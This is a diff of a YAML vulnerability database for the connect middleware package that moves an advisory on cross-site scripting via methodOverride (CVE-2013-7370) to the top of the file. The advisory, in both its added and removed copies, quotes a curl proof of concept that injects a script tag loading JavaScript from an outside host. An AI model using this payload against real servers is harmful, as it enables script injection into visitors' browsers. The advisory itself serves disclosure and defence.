@@ -1,4 +1,23 @@
 ---
+- id: ossindex:maven:org.webjars.npm:connect:1970-01-01
+  title: Cross-Site Scripting with connect.methodOverride()
+  description: |-
+    This middleware overwrite req.method with the req.body['_method'] value. When you don't catch the error it responds with a default error msg: "Cannot [METHOD] [URL]" (https://github.com/senchalabs/connect/blob/6db901f967036ccc3c892b4bcb5bcb59e0b0dca9/lib/proto.js#L155). Because this is not enough sanitized, you can force a Cross-Site Scripting in the response:
+
+    ~ curl "localhost:3000" -d "_method=<script src=http://martes13.net/a.js></script>"
+    Cannot <SCRIPT SRC=HTTP://MARTES13.NET/A.JS></SCRIPT> /
+    This is very dangerous because in a server like ExpressJS it won't be handled with a app.all('/*', ...), so all servers using this middleware are vulnerable.
+  affected_package: org.webjars.npm:connect
+  vulnerable_versions:
+  - "<=2.8.0"
+  package_manager: maven
+  credit:
+  - OSSIndex
+  references:
+  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-7370
+  - https://github.com/senchalabs/connect/issues/831
+  - https://nodesecurity.io/advisories/3
+  source_url: https://ossindex.net/resource/package/7107639528/vulnerabilities
 - id: ossindex:maven:org.webjars.npm:connect:2017-03-03
   title: Denial of Service (DoS)
   description: "> When using the static middleware, if the URL contains a valid file
@@ -63,23 +82,4 @@
   - https://cwe.mitre.org/data/definitions/79.html
   - https://github.com/senchalabs/connect/commit/c1daf27b2067b07fe3e9a66ce7f9121a0fa597b3
   - https://github.com/senchalabs/connect/issues/473
-  source_url: https://ossindex.net/resource/package/7107639528/vulnerabilities
-- id: ossindex:maven:org.webjars.npm:connect:1970-01-01
-  title: Cross-Site Scripting with connect.methodOverride()
-  description: |-
-    This middleware overwrite req.method with the req.body['_method'] value. When you don't catch the error it responds with a default error msg: "Cannot [METHOD] [URL]" (https://github.com/senchalabs/connect/blob/6db901f967036ccc3c892b4bcb5bcb59e0b0dca9/lib/proto.js#L155). Because this is not enough sanitized, you can force a Cross-Site Scripting in the response:
-
-    ~ curl "localhost:3000" -d "_method=<script src=http://martes13.net/a.js></script>"
-    Cannot <SCRIPT SRC=HTTP://MARTES13.NET/A.JS></SCRIPT> /
-    This is very dangerous because in a server like ExpressJS it won't be handled with a app.all('/*', ...), so all servers using this middleware are vulnerable.
-  affected_package: org.webjars.npm:connect
-  vulnerable_versions:
-  - "<=2.8.0"
-  package_manager: maven
-  credit:
-  - OSSIndex
-  references:
-  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-7370
-  - https://github.com/senchalabs/connect/issues/831
-  - https://nodesecurity.io/advisories/3
   source_url: https://ossindex.net/resource/package/7107639528/vulnerabilities
